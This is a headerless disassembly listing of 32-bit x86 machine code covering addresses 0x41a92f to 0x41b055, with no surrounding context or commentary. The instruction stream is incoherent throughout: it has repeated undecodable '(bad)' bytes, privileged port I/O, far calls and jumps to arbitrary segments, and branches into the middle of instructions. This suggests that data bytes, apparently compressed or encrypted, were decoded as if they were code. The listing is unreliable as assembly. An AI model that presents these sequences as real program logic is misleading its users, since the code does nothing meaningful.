  41a92f:	lods   eax,DWORD PTR ds:[esi]
  41a930:	mov    ecx,0xe917b369
  41a935:	jae    0x41a954
  41a937:	xlat   BYTE PTR ds:[ebx]
  41a938:	push   eax
  41a939:	push   ecx
  41a93a:	loopne 0x41a8be
  41a93c:	jg     0x41a9a7
  41a93e:	jge    0x41a97a
  41a940:	jne    0x41a96f
  41a942:	adc    eax,0x5a367885
  41a947:	stos   BYTE PTR es:[edi],al
  41a948:	or     al,0x13
  41a94a:	sbb    ch,BYTE PTR [esi-0x74243f2f]
  41a950:	inc    eax
  41a951:	jae    0x41a981
  41a953:	stc    
  41a954:	(bad)  
  41a955:	fisttp DWORD PTR [eax]
  41a957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a958:	and    eax,0xd3b59955
  41a95d:	sbb    DWORD PTR [eax],edx
  41a95f:	jge    0x41a927
  41a961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a962:	fs mov ch,0xa2
  41a965:	xor    DWORD PTR [ecx],esi
  41a967:	mov    cl,0x3e
  41a969:	xchg   DWORD PTR [edx-0x7c],edx
  41a96c:	call   0x32b1:0x8ce662b6
  41a973:	add    BYTE PTR [ecx+esi*8],dh
  41a976:	and    cl,BYTE PTR [ebp-0x6a]
  41a979:	ror    BYTE PTR [esi-0x6ae134a7],0xe3
  41a980:	in     eax,0x45
  41a982:	in     eax,dx
  41a983:	aaa    
  41a984:	or     ah,BYTE PTR [ebx+0x4800199b]
  41a98a:	mov    bh,cl
  41a98c:	into   
  41a98d:	jg     0x41a9b0
  41a98f:	ins    BYTE PTR es:[edi],dx
  41a990:	mov    eax,ds:0x3c2d2169
  41a995:	shr    edx,0x73
  41a998:	(bad)  
  41a999:	retf   0x2328
  41a99c:	loopne 0x41a941
  41a99e:	add    eax,0xffffffab
  41a9a1:	les    ebp,FWORD PTR [ebp-0x3a1bd615]
  41a9a7:	xlat   BYTE PTR ds:[ebx]
  41a9a8:	test   BYTE PTR [edx-0x3760f7ae],ah
  41a9ae:	in     al,0x50
  41a9b0:	adc    al,0xe1
  41a9b2:	inc    ebx
  41a9b3:	mov    bh,BYTE PTR [ecx-0x2]
  41a9b6:	outs   dx,DWORD PTR ds:[esi]
  41a9b7:	or     DWORD PTR [ecx-0xde36a3c],esi
  41a9bd:	int    0x25
  41a9bf:	mov    esp,0x7e0b75d2
  41a9c4:	(bad)  
  41a9c5:	aam    0x6e
  41a9c7:	inc    ebx
  41a9c8:	enter  0x70e1,0xdd
  41a9cc:	inc    ebx
  41a9cd:	aaa    
  41a9ce:	xlat   BYTE PTR ds:[ebx]
  41a9cf:	sub    eax,0x8cebcea5
  41a9d4:	xchg   ebx,eax
  41a9d5:	mov    al,ds:0x2adbfbe4
  41a9da:	mov    ds:0xda17c27,eax
  41a9df:	adc    edi,DWORD PTR [edi+0x27]
  41a9e2:	outs   dx,BYTE PTR ds:[esi]
  41a9e3:	adc    eax,0xd8b944f8
  41a9e8:	test   al,0x7d
  41a9ea:	inc    ebx
  41a9eb:	xor    ebp,DWORD PTR [edx-0x21]
  41a9ee:	sbb    al,0x71
  41a9f0:	cmp    bl,0x60
  41a9f3:	push   edi
  41a9f4:	and    eax,0xc7d8da29
  41a9f9:	xchg   ecx,eax
  41a9fa:	scas   al,BYTE PTR es:[edi]
  41a9fb:	fcmovu st,st(7)
  41a9fd:	pop    edi
  41a9fe:	mov    bl,0xbf
  41aa00:	sub    al,0x8
  41aa02:	js     0x41aa56
  41aa04:	xchg   BYTE PTR [edi],cl
  41aa06:	out    0x8d,al
  41aa08:	(bad)
  41aa0d:	not    DWORD PTR [esi-0x294bae87]
  41aa13:	arpl   WORD PTR [ecx],di
  41aa15:	pop    edi
  41aa16:	pop    ecx
  41aa17:	out    dx,eax
  41aa18:	add    esp,DWORD PTR [eax+0x6d]
  41aa1b:	sbb    BYTE PTR [esi-0x38646b9e],0xb
  41aa22:	or     BYTE PTR ds:0xc7ae08e4,ah
  41aa28:	pop    ebp
  41aa29:	stos   BYTE PTR es:[edi],al
  41aa2a:	call   0xdc58:0xad10d481
  41aa31:	in     eax,0x4a
  41aa33:	arpl   ax,dx
  41aa35:	inc    ebp
  41aa36:	mov    edx,0x11de0965
  41aa3b:	pop    eax
  41aa3c:	dec    ecx
  41aa3d:	adc    eax,0xb59ae9f2
  41aa42:	xor    BYTE PTR [esi],ch
  41aa44:	(bad)  
  41aa45:	cmp    DWORD PTR [edi+0x78f0502b],ebp
  41aa4b:	xchg   ebp,eax
  41aa4c:	stc    
  41aa4d:	push   cs
  41aa4e:	fcomp  DWORD PTR [edi]
  41aa50:	aaa    
  41aa51:	cmp    DWORD PTR [esi+ecx*4-0x71],eax
  41aa55:	aaa    
  41aa56:	mov    ecx,0xc255637a
  41aa5b:	xor    eax,0xb77bb594
  41aa60:	mov    ecx,0x2a88f41b
  41aa65:	mov    edx,DWORD PTR [esi]
  41aa67:	ins    BYTE PTR es:[edi],dx
  41aa68:	js     0x41aaa6
  41aa6a:	mov    WORD PTR ds:0xf9621189,fs
  41aa70:	lods   eax,DWORD PTR ds:[esi]
  41aa71:	les    esi,FWORD PTR [ebx-0x75713a1c]
  41aa77:	adc    al,0x0
  41aa79:	jmp    FWORD PTR [ecx+esi*1-0x57]
  41aa7d:	(bad)  
  41aa7e:	or     eax,0x2f042de0
  41aa83:	jnp    0x41aab0
  41aa85:	sub    al,0xe5
  41aa87:	adc    BYTE PTR [esi+0x2cca68fc],cl
  41aa8d:	test   DWORD PTR [esi+0x3ce49d9f],eax
  41aa93:	enter  0xca16,0x3
  41aa97:	push   ecx
  41aa98:	xor    eax,0xa6dc5e7
  41aa9d:	dec    eax
  41aa9e:	push   0xffffffb6
  41aaa0:	pushf  
  41aaa1:	add    DWORD PTR [edx+0x27],ecx
  41aaa4:	pop    ebx
  41aaa5:	xchg   esi,eax
  41aaa6:	imul   esi,DWORD PTR [edx+edi*4],0xffffffa2
  41aaaa:	mov    ebx,0xc2decf6a
  41aaaf:	add    BYTE PTR [edi+0x0],ch
  41aab2:	and    al,0x49
  41aab4:	mov    ebx,0x48933090
  41aab9:	outs   dx,BYTE PTR ds:[esi]
  41aaba:	je     0x41aa46
  41aabc:	xchg   esp,eax
  41aabd:	cmp    BYTE PTR [ebp-0x2b],ah
  41aac0:	pusha  
  41aac1:	mov    eax,0x61b17dcf
  41aac6:	test   DWORD PTR [ecx+0x2c],0x2e069032
  41aacd:	js     0x41ab3e
  41aacf:	cmp    eax,0x70406181
  41aad4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad5:	bound  edi,QWORD PTR gs:[ebx]
  41aad8:	sbb    al,0x3e
  41aada:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aadb:	fmul   QWORD PTR [esi+edi*8]
  41aade:	dec    edx
  41aadf:	cmp    eax,0xb187ec2c
  41aae4:	and    DWORD PTR [ecx],esi
  41aae6:	adc    al,0x4b
  41aae8:	popf   
  41aae9:	add    al,0xb
  41aaeb:	adc    DWORD PTR [edi-0x31],edx
  41aaee:	or     BYTE PTR [edi],0x6b
  41aaf1:	aaa    
  41aaf2:	sub    dl,BYTE PTR [eax]
  41aaf4:	dec    ecx
  41aaf5:	push   0x609080bb
  41aafa:	aad    0xeb
  41aafc:	sub    esi,DWORD PTR [edi-0x61]
  41aaff:	outs   dx,BYTE PTR ds:[esi]
  41ab00:	sbb    eax,DWORD PTR [ebx-0x5220230c]
  41ab06:	sar    BYTE PTR [esi+0x37],0xeb
  41ab0a:	out    0xfc,al
  41ab0c:	in     al,dx
  41ab0d:	xor    DWORD PTR [esi-0xc],edi
  41ab10:	mov    ebp,0x6ef0c273
  41ab15:	and    DWORD PTR [edx],edx
  41ab17:	mov    ?,WORD PTR [ecx-0x2d]
  41ab1a:	outs   dx,DWORD PTR ds:[esi]
  41ab1b:	dec    edi
  41ab1c:	xlat   BYTE PTR ds:[ebx]
  41ab1d:	xor    ecx,DWORD PTR [edx+ebx*1+0x10746682]
  41ab24:	(bad)  
  41ab25:	fpatan 
  41ab27:	mov    edx,DWORD PTR [esi+0x6571642a]
  41ab2d:	mov    eax,0xe5b38722
  41ab32:	sar    DWORD PTR [ebx-0x4544c812],cl
  41ab38:	fcmovne st,st(5)
  41ab3a:	cmp    cl,BYTE PTR [edi]
  41ab3c:	inc    ecx
  41ab3d:	adc    eax,0xeaf9db93
  41ab42:	inc    esi
  41ab43:	ins    DWORD PTR es:[edi],dx
  41ab44:	aam    0x9b
  41ab46:	(bad)  
  41ab47:	stc    
  41ab48:	pop    eax
  41ab49:	popa   
  41ab4a:	icebp  
  41ab4b:	into   
  41ab4c:	sub    al,0x21
  41ab4e:	xor    al,0x19
  41ab50:	xchg   BYTE PTR [edi],bh
  41ab52:	addr16 cli 
  41ab54:	xchg   ebp,eax
  41ab55:	push   ebp
  41ab56:	repnz neg BYTE PTR [ebx]
  41ab59:	retf   0xcaad
  41ab5c:	sub    ebx,esi
  41ab5e:	out    0x3f,eax
  41ab60:	in     al,0x1d
  41ab62:	enter  0xcdef,0xdb
  41ab66:	dec    edx
  41ab67:	dec    ecx
  41ab68:	mov    dl,0xc7
  41ab6a:	sbb    ah,dh
  41ab6c:	test   al,0x4f
  41ab6e:	xchg   ecx,eax
  41ab6f:	or     edi,DWORD PTR [ebp-0x8c8f11a]
  41ab75:	pop    esp
  41ab76:	test   eax,0x9ef83ccd
  41ab7b:	mov    edx,0xbce793ec
  41ab80:	dec    edx
  41ab81:	pusha  
  41ab82:	fsubr  DWORD PTR [eax]
  41ab84:	mov    edx,0x482a0eb6
  41ab89:	push   esi
  41ab8a:	mov    ecx,0xf2c910d5
  41ab8f:	pop    ss
  41ab90:	xchg   edi,eax
  41ab91:	iret   
  41ab92:	pop    es
  41ab93:	mov    dh,0x53
  41ab95:	sbb    dl,BYTE PTR [eax+eiz*2]
  41ab98:	test   DWORD PTR [ebx+0x56],eax
  41ab9b:	pop    ebp
  41ab9c:	cwde   
  41ab9d:	iret   
  41ab9e:	mov    esp,0xd16bdd71
  41aba3:	pop    edi
  41aba4:	sub    DWORD PTR [ebp-0x283d5a4c],0xb41dbaf3
  41abae:	cli    
  41abaf:	add    esi,DWORD PTR es:[eax-0xa]
  41abb3:	mov    ebx,esi
  41abb5:	outs   dx,BYTE PTR ds:[esi]
  41abb6:	fbld   TBYTE PTR [esp+ebx*4+0x354ce960]
  41abbd:	mov    ds:0x79146361,al
  41abc2:	add    al,0x9c
  41abc4:	xchg   BYTE PTR [esi+ebp*8+0x9],bl
  41abc8:	(bad)  
  41abc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abca:	scas   eax,DWORD PTR es:[edi]
  41abcb:	sbb    BYTE PTR [edx],dh
  41abcd:	xor    cl,BYTE PTR [ecx+0x61]
  41abd0:	ffree  st(4)
  41abd2:	sbb    BYTE PTR [edi+0x6236b948],bh
  41abd8:	and    ebp,DWORD PTR [ebx+0xa]
  41abdb:	adc    ebp,DWORD PTR ds:0xa68ded0e
  41abe1:	add    al,0x96
  41abe3:	xor    edx,DWORD PTR [esi-0x7f]
  41abe6:	xchg   DWORD PTR [ecx-0x80],edx
  41abe9:	les    eax,FWORD PTR [ebx-0x6]
  41abec:	pop    ds
  41abed:	add    ah,BYTE PTR [ecx-0x79730b4]
  41abf3:	fdiv   DWORD PTR [eax-0x6b46760c]
  41abf9:	jg     0x41ac1f
  41abfb:	add    esp,DWORD PTR [ecx]
  41abfd:	popa   
  41abfe:	mov    ds,WORD PTR [eax+edi*8]
  41ac01:	and    ebx,edi
  41ac03:	mov    esp,0x624825d4
  41ac08:	xchg   esp,eax
  41ac09:	lahf   
  41ac0a:	in     al,dx
  41ac0b:	(bad)  
  41ac0c:	jmp    0xc10dcdff
  41ac11:	popa   
  41ac12:	push   ds
  41ac13:	mov    cs,WORD PTR [esi+eiz*1]
  41ac16:	xor    DWORD PTR [edi],ebx
  41ac18:	aas    
  41ac19:	mov    ah,0xe7
  41ac1b:	out    dx,eax
  41ac1c:	mov    gs,WORD PTR [ecx-0x24]
  41ac1f:	jmp    0xd006:0xa6e97b7f
  41ac26:	cmp    edx,DWORD PTR [ebp+ebx*1-0x2]
  41ac2a:	push   ds
  41ac2b:	mov    al,0xc6
  41ac2d:	pop    esi
  41ac2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac2f:	icebp  
  41ac30:	xchg   ebx,eax
  41ac31:	test   DWORD PTR [ecx+0x29],esp
  41ac34:	inc    edi
  41ac35:	ins    BYTE PTR es:[edi],dx
  41ac36:	leave  
  41ac37:	adc    BYTE PTR [ebp-0x1d46996e],0x22
  41ac3e:	push   edi
  41ac3f:	cmp    edx,DWORD PTR [edi]
  41ac41:	or     eax,0x10ffba59
  41ac46:	in     eax,0xf2
  41ac48:	add    al,dh
  41ac4a:	loope  0x41ac3e
  41ac4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac4d:	fs dec esi
  41ac4f:	ficomp DWORD PTR [esi]
  41ac51:	sbb    bh,dh
  41ac53:	fwait
  41ac54:	sbb    BYTE PTR [ebp+0x18b470ce],0x5
  41ac5b:	outs   dx,BYTE PTR ds:[esi]
  41ac5c:	cld    
  41ac5d:	arpl   WORD PTR [edi+0x2f],si
  41ac60:	xchg   edx,eax
  41ac61:	mov    edx,ebx
  41ac63:	ds inc esp
  41ac65:	ds pop es
  41ac67:	adc    al,0x9f
  41ac69:	out    dx,eax
  41ac6a:	les    ebp,FWORD PTR [edx]
  41ac6c:	add    eax,0xdaa9b312
  41ac71:	or     bl,bl
  41ac73:	mov    ebp,0x34f0d6f1
  41ac78:	sar    DWORD PTR [ecx],0x23
  41ac7b:	dec    esp
  41ac7c:	repnz cs pop esi
  41ac7f:	xor    ch,BYTE PTR ds:0x7a3852c6
  41ac85:	mov    dl,0xb1
  41ac87:	shr    BYTE PTR [eax-0xa30daa9],cl
  41ac8d:	and    cl,BYTE PTR [edx-0x453f4449]
  41ac93:	and    DWORD PTR [edi],0x1ba792c4
  41ac99:	out    0x9b,al
  41ac9b:	and    BYTE PTR [esi+ebp*1+0x6a4c49f2],0xfe
  41aca3:	(bad)  
  41aca4:	mov    edx,0xebc713dc
  41aca9:	ds adc eax,0xe2ed0a0e
  41acaf:	adc    ecx,DWORD PTR [esi-0x4e884693]
  41acb5:	neg    BYTE PTR [ebp-0x6c]
  41acb8:	jb     0x41acf5
  41acba:	test   edi,0x7918644a
  41acc0:	jmp    0x41acd3
  41acc2:	daa    
  41acc3:	jp     0x41ace5
  41acc5:	sbb    ecx,esi
  41acc7:	ja     0x41acc7
  41acc9:	cld    
  41acca:	dec    edi
  41accb:	(bad)  
  41accc:	fucomp st(5)
  41acce:	fdivr  DWORD PTR [edi-0x37]
  41acd1:	xchg   BYTE PTR [esi-0x40],bh
  41acd4:	sub    al,0xa8
  41acd6:	mov    ah,0x53
  41acd8:	xor    ecx,edx
  41acda:	xor    BYTE PTR [esi],ah
  41acdc:	cdq    
  41acdd:	xchg   esp,eax
  41acde:	push   edx
  41acdf:	loopne 0x41ad2c
  41ace1:	mov    ch,BYTE PTR [esi-0x4a8e1d54]
  41ace7:	adc    eax,0xc0745148
  41acec:	paddq  mm1,QWORD PTR [edi+0x2265b0bf]
  41acf3:	jo     0x41ad66
  41acf5:	icebp  
  41acf6:	retf   
  41acf7:	lock mov edi,0x9a1b33c2
  41acfd:	add    edi,DWORD PTR ds:0xeb76540
  41ad03:	dec    edx
  41ad04:	xchg   ecx,eax
  41ad05:	cmp    eax,0x92e57108
  41ad0a:	popf   
  41ad0b:	mov    BYTE PTR [esp+esi*4+0x1baaf67a],al
  41ad12:	stos   DWORD PTR es:[edi],eax
  41ad13:	out    dx,eax
  41ad14:	repz fdiv DWORD PTR [ebx]
  41ad17:	push   esp
  41ad18:	ds retf 
  41ad1a:	mov    edx,0x863dac3d
  41ad1f:	pushf  
  41ad20:	shl    esp,0x4
  41ad23:	imul   DWORD PTR [esi+0x73]
  41ad26:	jo     0x41ad11
  41ad28:	in     al,0xa6
  41ad2a:	cmp    dl,al
  41ad2c:	scas   al,BYTE PTR es:[edi]
  41ad2d:	inc    eax
  41ad2e:	dec    esi
  41ad2f:	sbb    dl,0xa0
  41ad32:	sar    esi,cl
  41ad34:	in     eax,dx
  41ad35:	push   0xa17d95ea
  41ad3a:	pop    ecx
  41ad3c:	ja     0x41ad3e
  41ad3e:	inc    edi
  41ad3f:	stos   DWORD PTR es:[edi],eax
  41ad40:	xchg   edi,eax
  41ad41:	je     0x41ad09
  41ad43:	ror    esi,cl
  41ad45:	mov    al,ds:0xa1863129
  41ad4b:	ror    BYTE PTR [ebx+0x53cbfcfc],cl
  41ad51:	mov    eax,ds:0x4ec3a85a
  41ad56:	or     cl,dl
  41ad58:	push   ebp
  41ad59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad5a:	lock mov edi,0x5261138e
  41ad60:	dec    ebx
  41ad61:	repnz fimul WORD PTR [esi]
  41ad64:	inc    ebx
  41ad65:	sub    ch,cl
  41ad67:	outs   dx,DWORD PTR ds:[esi]
  41ad68:	push   edi
  41ad69:	pop    es
  41ad6a:	retf   0x777c
  41ad6d:	in     eax,0x18
  41ad6f:	sbb    eax,0x6874e876
  41ad74:	aas    
  41ad75:	fisubr WORD PTR [eax-0x6f]
  41ad78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad79:	adc    al,0xb5
  41ad7b:	cdq    
  41ad7c:	cli    
  41ad7d:	mov    dl,0x1f
  41ad7f:	cs test al,0xe7
  41ad82:	push   ebp
  41ad83:	(bad)
  41ad87:	cmp    bl,ah
  41ad89:	outs   dx,BYTE PTR ds:[esi]
  41ad8a:	ins    BYTE PTR es:[edi],dx
  41ad8b:	xchg   ebx,eax
  41ad8c:	out    dx,al
  41ad8d:	lea    edx,[edi+0x63]
  41ad90:	and    eax,0xb780aeff
  41ad95:	iret   
  41ad96:	sub    edx,edx
  41ad98:	scas   al,BYTE PTR es:[edi]
  41ad99:	cmp    DWORD PTR [esi],esp
  41ad9b:	xchg   edi,eax
  41ad9c:	push   ecx
  41ad9d:	dec    edi
  41ad9e:	sahf   
  41ad9f:	add    al,0xd4
  41ada1:	and    ah,BYTE PTR [ebx-0x1d4b5e66]
  41ada7:	daa    
  41ada8:	rcl    BYTE PTR [edi-0x77],cl
  41adab:	(bad)  
  41adac:	push   esp
  41adad:	fistp  WORD PTR [ebx]
  41adaf:	sub    al,0x18
  41adb1:	leave  
  41adb2:	int    0xb2
  41adb4:	push   ecx
  41adb5:	or     esp,DWORD PTR [edx+0x2b]
  41adb8:	inc    edi
  41adb9:	mov    ebx,0xbe1ffa5a
  41adbe:	push   0xffffffc1
  41adc0:	scas   al,BYTE PTR es:[edi]
  41adc1:	fwait
  41adc2:	add    edi,ecx
  41adc4:	or     DWORD PTR ds:0x3176e2b1,edx
  41adca:	rcr    DWORD PTR [ebp-0x897c2f],0x59
  41add1:	dec    esi
  41add2:	cdq    
  41add3:	inc    esi
  41add4:	dec    edx
  41add5:	pop    edx
  41add6:	dec    ecx
  41add7:	cmp    al,0xe8
  41add9:	jmp    0x159f:0x32e6849a
  41ade0:	push   esi
  41ade1:	shl    DWORD PTR [eax-0x32],1
  41ade4:	daa    
  41ade5:	sbb    al,bl
  41ade7:	(bad)  
  41ade8:	xchg   edx,eax
  41ade9:	cmp    BYTE PTR [eax+ebx*4],ch
  41adec:	xor    cl,bh
  41adee:	inc    edx
  41adef:	and    eax,0x8d9edb0d
  41adf4:	push   ss
  41adf5:	cmp    eax,0x66c4e6dd
  41adfa:	repnz mov ebx,0x9a080cef
  41ae00:	mov    ?,WORD PTR [edx+0x5e]
  41ae03:	bound  edx,QWORD PTR [ebx]
  41ae05:	jmp    0x41ad9d
  41ae07:	cmp    al,0x84
  41ae09:	inc    ebx
  41ae0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae0b:	les    esi,FWORD PTR fs:[edi]
  41ae0e:	in     eax,0x48
  41ae10:	xchg   edx,eax
  41ae11:	inc    eax
  41ae12:	cld    
  41ae13:	mov    dh,0xdd
  41ae15:	xor    ecx,eax
  41ae17:	dec    eax
  41ae18:	pmaxub mm0,mm6
  41ae1b:	push   0xffffffa0
  41ae1d:	mov    ah,0x4a
  41ae1f:	fidivr DWORD PTR [eax-0x792cf7f3]
  41ae25:	inc    ax
  41ae27:	loopne 0x41add6
  41ae29:	pop    edi
  41ae2a:	mov    dl,dh
  41ae2c:	lock or BYTE PTR [esi-0xa0e37c2],bl
  41ae33:	aam    0xe1
  41ae35:	les    esi,FWORD PTR [esi]
  41ae37:	pushf  
  41ae38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae39:	xchg   ebx,eax
  41ae3a:	jmp    0xb8e5f6e7
  41ae3f:	cmp    al,dh
  41ae41:	push   edi
  41ae42:	pop    ss
  41ae43:	arpl   WORD PTR [edx],dx
  41ae45:	cli    
  41ae46:	lea    ebx,[ecx]
  41ae48:	ffree  st(4)
  41ae4a:	gs sbb ebp,ebx
  41ae4d:	or     BYTE PTR ds:0x98d62dea,bl
  41ae53:	cdq    
  41ae54:	dec    esp
  41ae55:	xor    DWORD PTR [ecx],esp
  41ae57:	mov    fs,WORD PTR [ebx]
  41ae59:	in     al,0xdc
  41ae5b:	ins    DWORD PTR es:[edi],dx
  41ae5c:	out    dx,al
  41ae5d:	mov    esp,0x5c85a2c8
  41ae62:	and    eax,0xb5001d34
  41ae67:	push   ecx
  41ae68:	aaa    
  41ae69:	out    dx,eax
  41ae6a:	cs jbe 0x41aeb6
  41ae6d:	mov    al,ah
  41ae6f:	push   ebx
  41ae70:	std    
  41ae71:	or     ebx,0x7c
  41ae74:	test   DWORD PTR [edi+0x6757d879],edi
  41ae7a:	outs   dx,DWORD PTR ds:[esi]
  41ae7b:	push   eax
  41ae7c:	push   0x7a
  41ae7e:	or     BYTE PTR [ebx+0x69],0x69
  41ae82:	inc    ecx
  41ae83:	scas   eax,DWORD PTR es:[edi]
  41ae84:	(bad)  
  41ae85:	mov    ds:0x125ed7d0,al
  41ae8a:	mov    DWORD PTR [ebx],ebx
  41ae8c:	repz (bad) 
  41ae8e:	jnp    0x41aed0
  41ae90:	cmp    eax,0xda60eb81
  41ae95:	stos   BYTE PTR es:[edi],al
  41ae96:	mov    edi,0xf09207ac
  41ae9b:	xor    eax,0x1ecedbba
  41aea0:	xor    BYTE PTR [ebp+0x50a1e0fd],ch
  41aea6:	xchg   ecx,eax
  41aea7:	cmc    
  41aea8:	data16 jno 0x41af13
  41aeab:	push   esp
  41aeac:	inc    edx
  41aead:	push   esi
  41aeae:	outs   dx,DWORD PTR ds:[esi]
  41aeaf:	stos   BYTE PTR es:[edi],al
  41aeb0:	push   cs
  41aeb1:	adc    eax,0xfa441a32
  41aeb6:	jo     0x41af35
  41aeb8:	mov    bh,0x5e
  41aeba:	mov    ds:0x2b9d98e6,eax
  41aebf:	mov    al,0xa2
  41aec1:	cmp    al,0x3a
  41aec3:	push   ss
  41aec4:	pushf  
  41aec5:	popf   
  41aec6:	lods   al,BYTE PTR ds:[esi]
  41aec7:	jle    0x41ae4c
  41aec9:	and    al,ah
  41aecb:	or     bh,ah
  41aecd:	mov    edx,0x21d29f81
  41aed2:	jl     0x41ae74
  41aed4:	jmp    0xbd3ff850
  41aed9:	and    esp,DWORD PTR [esi+eiz*1]
  41aedc:	out    0x2b,al
  41aede:	fsubr  st,st(4)
  41aee0:	xchg   edx,eax
  41aee1:	inc    ecx
  41aee2:	sar    DWORD PTR [edi],cl
  41aee4:	jg     0x41aefa
  41aee6:	cmp    al,0x6
  41aee8:	and    BYTE PTR [eax-0x5f],dl
  41aeeb:	sub    esp,DWORD PTR [eax+0x6f5e29fb]
  41aef1:	(bad)  
  41aef2:	sbb    al,0x88
  41aef4:	sub    bh,BYTE PTR [ebx]
  41aef6:	xchg   edi,eax
  41aef7:	scas   al,BYTE PTR es:[edi]
  41aef8:	push   eax
  41aef9:	xor    ebp,DWORD PTR [edx+0x1c53f1e8]
  41aeff:	(bad)  
  41af01:	ret    
  41af02:	test   al,0x79
  41af04:	and    al,0x41
  41af06:	cmc    
  41af07:	mov    BYTE PTR [eax-0x381fa4ae],ch
  41af0d:	pop    ebx
  41af0e:	shr    BYTE PTR [edx-0x54a48f0e],0x26
  41af15:	xor    BYTE PTR [ebp+0x41],dl
  41af18:	icebp  
  41af19:	daa    
  41af1a:	imul   DWORD PTR [esi+0x1d]
  41af1d:	sbb    al,0xae
  41af1f:	push   0xffffffe4
  41af21:	push   esp
  41af22:	cmp    al,0x6d
  41af24:	iret   
  41af25:	mov    ah,0x49
  41af27:	in     eax,dx
  41af28:	cmp    eax,DWORD PTR [ebx-0x7f]
  41af2b:	sub    DWORD PTR [ecx],ecx
  41af2d:	cmp    ecx,DWORD PTR [ebx-0xe]
  41af30:	or     ah,bl
  41af32:	pop    esi
  41af33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af34:	daa    
  41af35:	in     eax,dx
  41af36:	add    BYTE PTR [esi+0x2b7fb5e0],bl
  41af3c:	(bad)  
  41af3d:	xor    al,0x8b
  41af3f:	sbb    al,0xd7
  41af41:	mov    BYTE PTR [ecx-0x283c1d12],ah
  41af47:	jmp    0xd0da6283
  41af4c:	ficom  DWORD PTR [edi+eiz*1]
  41af4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af50:	lahf   
  41af51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af52:	add    edx,DWORD PTR [edi-0x32727d54]
  41af58:	mov    ah,0x86
  41af5a:	mov    ch,0xf2
  41af5c:	inc    ecx
  41af5d:	push   ebx
  41af5e:	adc    eax,DWORD PTR ds:0x6f12b83d
  41af64:	out    0xc9,eax
  41af66:	pop    ss
  41af67:	gs je  0x41aefa
  41af6a:	ins    DWORD PTR es:[edi],dx
  41af6b:	inc    edx
  41af6c:	xor    al,0xba
  41af6e:	adc    edi,DWORD PTR [edx-0x60112c90]
  41af74:	sub    al,0xd9
  41af76:	pop    eax
  41af77:	aam    0x3a
  41af79:	sahf   
  41af7a:	aam    0x8e
  41af7c:	xor    eax,0xa67af835
  41af81:	or     DWORD PTR [edx-0x77],edi
  41af84:	dec    edx
  41af85:	cdq    
  41af86:	out    dx,eax
  41af87:	xlat   BYTE PTR ds:[ebx]
  41af88:	sbb    al,0xf8
  41af8a:	xchg   ebx,eax
  41af8b:	jecxz  0x41af98
  41af8d:	int    0x1b
  41af8f:	sub    eax,0xd33fd02b
  41af94:	aad    0x88
  41af96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af97:	sbb    al,0x43
  41af99:	push   es
  41af9a:	(bad)  
  41af9c:	stos   DWORD PTR es:[edi],eax
  41af9d:	xchg   edx,eax
  41af9e:	cmp    DWORD PTR ss:[eax-0x1d3bb89e],esi
  41afa5:	int3   
  41afa6:	mov    ebx,0x9a078611
  41afab:	scas   al,BYTE PTR es:[edi]
  41afac:	mov    gs,WORD PTR [ebx+0x5a4f947e]
  41afb2:	call   0xbf83a054
  41afb7:	daa    
  41afb8:	jno    0x41afe6
  41afba:	pop    ebp
  41afbb:	cdq    
  41afbc:	lahf   
  41afbd:	push   ebp
  41afbe:	retf   0xaa29
  41afc1:	xchg   ebx,eax
  41afc2:	dec    edx
  41afc3:	out    0xe4,eax
  41afc5:	jl     0x41afe6
  41afc7:	je     0x41af94
  41afc9:	loopne 0x41afac
  41afcb:	adc    BYTE PTR [ebp+0x55f76994],dh
  41afd1:	jns    0x41b013
  41afd3:	cmp    al,0xfd
  41afd5:	test   ebx,esi
  41afd7:	adc    eax,DWORD PTR [ebx-0x4f928e5f]
  41afdd:	mov    bh,0xe6
  41afdf:	clc    
  41afe0:	push   ebp
  41afe1:	inc    ebp
  41afe2:	push   ebx
  41afe3:	loope  0x41b002
  41afe5:	lahf   
  41afe6:	loope  0x41afc1
  41afe8:	test   eax,0x107377a9
  41afed:	sub    al,0x31
  41afef:	or     eax,0x7c6ce430
  41aff4:	test   DWORD PTR ds:0xd2e9ebfc,esi
  41affa:	lea    esi,[edi-0x4d00195e]
  41b000:	add    esp,DWORD PTR [eax]
  41b002:	mov    cl,0xd5
  41b004:	ds iret 
  41b006:	shl    DWORD PTR [edx],0x3a
  41b009:	(bad)  
  41b00a:	xchg   edi,eax
  41b00b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b00c:	adc    DWORD PTR [edi],edx
  41b00e:	rcl    BYTE PTR [esi*4-0x3e3ac513],0x9f
  41b016:	jge    0x41b043
  41b018:	std    
  41b019:	inc    ecx
  41b01a:	stos   DWORD PTR es:[edi],eax
  41b01b:	inc    esp
  41b01c:	loop   0x41afed
  41b01e:	stc    
  41b01f:	les    ebx,FWORD PTR [ebx+0x35506261]
  41b025:	adc    bh,BYTE PTR [eax+0x2bfbd660]
  41b02b:	fmulp  st(7),st
  41b02d:	inc    edx
  41b02e:	xchg   esi,eax
  41b02f:	sbb    esp,DWORD PTR [eax+0x24]
  41b032:	in     al,dx
  41b033:	mov    cl,0x1f
  41b035:	repnz pusha 
  41b037:	pop    ss
  41b038:	test   eax,0x7f264066
  41b03d:	mov    ch,0x80
  41b03f:	cmovbe esi,DWORD PTR [edi+0x6b]
  41b043:	mov    ch,dh
  41b045:	pop    DWORD PTR [edx]
  41b047:	out    0xab,al
  41b049:	clc    
  41b04a:	add    al,0x93
  41b04c:	sbb    ebp,DWORD PTR [eax]
  41b04e:	std    
  41b04f:	bound  edi,QWORD PTR [edi+0x1b500d48]
  41b055:	test   eax,0xb07bde2a
